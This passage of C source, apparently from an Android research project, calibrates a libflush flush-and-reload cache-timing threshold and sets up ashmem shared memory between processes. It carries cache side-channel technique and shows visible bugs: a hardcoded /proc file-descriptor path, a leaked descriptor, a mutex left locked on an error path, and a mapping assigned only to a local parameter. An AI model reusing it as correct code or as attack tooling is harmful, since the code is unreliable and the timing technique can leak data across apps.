    libflush_flush(libflush_session, address);

    count2 = libflush_reload_address_and_flush(libflush_session, address);
    if (threshold > 0 && count2 < threshold) {
        if (count2 > threshold - 20) {
            threshold = count2;
        } else {
            threshold = threshold - 20;

        }
    }

///    count2 = libflush_probe(libflush_session, address);
//    LOGD("adjust_threshold Time: %d threshold %d", count2, threshold);

    return threshold;

//    if (count2 < 800) {
//        LOGD("weather:AddressScan2: Address: %lu Time taken: %d", address, count2);
//    }

}

int set_shared_mem(int shared_data_shm_fd, int *shared_data, pthread_mutex_t *shared_mem_lock) {
    pthread_mutex_lock(shared_mem_lock);
    shared_data_shm_fd = open("/" ASHMEM_NAME_DEF, O_RDWR);
    LOGD("shared_data_shm_fd %d", shared_data_shm_fd);

    ioctl(shared_data_shm_fd, ASHMEM_SET_NAME, "shared_data");
    ioctl(shared_data_shm_fd, ASHMEM_SET_SIZE, sizeof(int));

    shared_data = mmap(NULL, sizeof(int), PROT_READ | PROT_WRITE,
                       MAP_SHARED, shared_data_shm_fd, 0);
    if (shared_data == MAP_FAILED) {
        LOGD("shared_data_shm_fd Error: Could not map shared memory.");
//        close(shared_data_shm_fd);
        return -1;
    }
    shared_data[0] = 5;
    pthread_mutex_unlock(shared_mem_lock);

    LOGD("shared_data_shm_fd shared_data %d", shared_data);
//    close(shared_data_shm_fd);

//    return shared_data;
    return shared_data_shm_fd;
//    close(*shared_data_shm_fd);
}

int set_shared_memfd(int shared_data_shm_fd, int *shared_data, pthread_mutex_t *shared_mem_lock) {
//    pthread_mutex_lock(shared_mem_lock);
//
//    int fd = memfd_create("shared_data", MFD_ALLOW_SEALING);
//    if (fd == -1) {
//        LOGD("shared_data_shm_fd fd -1");
//        pthread_mutex_unlock(shared_mem_lock);
//
//        return -1;
//    }
//    pthread_mutex_unlock(shared_mem_lock);

    return 1;
}


int set_shared_mem_child(jchar *fileDes, pthread_mutex_t *shared_mem_lock) {
    LOGD("shared_data_shm inside set_shared_mem_child");

    pthread_mutex_lock(shared_mem_lock);
    LOGD("shared_data_shm inside set_shared_mem_child lock");

//    for(int i=0;i<10;i++){
//        LOGD("shared_data_shm_fd %c", fileDes[i]);
//    }
    int shared_data_shm_fd = open(fileDes, O_RDONLY);
    LOGD("shared_data_shm_fd child %d", shared_data_shm_fd);

    int *shared_data;
    shared_data = mmap(NULL, sizeof(int), PROT_READ | PROT_WRITE,
                       MAP_SHARED, shared_data_shm_fd, 0);
    if (shared_data == MAP_FAILED) {
        LOGD("shared_data_shm_fd Error: Could not map shared memory.");
        close(shared_data_shm_fd);
        return -1;
    }
    shared_data[0] = 9;
    pthread_mutex_unlock(shared_mem_lock);

    LOGD("shared_data_shm_fd child shared_data %d", shared_data);
    close(shared_data_shm_fd);

//    return shared_data;
    return shared_data_shm_fd;
//    close(*shared_data_shm_fd);
}


int set_shared_mem_val(int *shared_data, int val, pthread_mutex_t *shared_mem_lock) {
    pthread_mutex_lock(shared_mem_lock);
    int fd = open("/proc/19187/fd/49", O_RDWR);
    if (fd == -1) {
        LOGD("shared_data_shm passsed sharwd_data is null");
        pthread_mutex_unlock(shared_mem_lock);
        return -1;
    }
    shared_data[0] = val;
    pthread_mutex_unlock(shared_mem_lock);

    return 1;
}

int get_shared_mem_val(int *shared_data, pthread_mutex_t *shared_mem_lock) {
    pthread_mutex_lock(shared_mem_lock);
    if (shared_data == NULL) {
        LOGD("shared_data_shm passsed sharwd_data is null");
        return -1;
    }
    int i = shared_data[0];
//    LOGD("shared_data_shm get_shared_mem_val hit %d", i);
    pthread_mutex_unlock(shared_mem_lock);
    return i;
}

int clean_shared_mem(int shared_data_shm_fd, pthread_mutex_t *shared_mem_lock) {
    pthread_mutex_lock(shared_mem_lock);
    close(shared_data_shm_fd);
    pthread_mutex_unlock(shared_mem_lock);
}













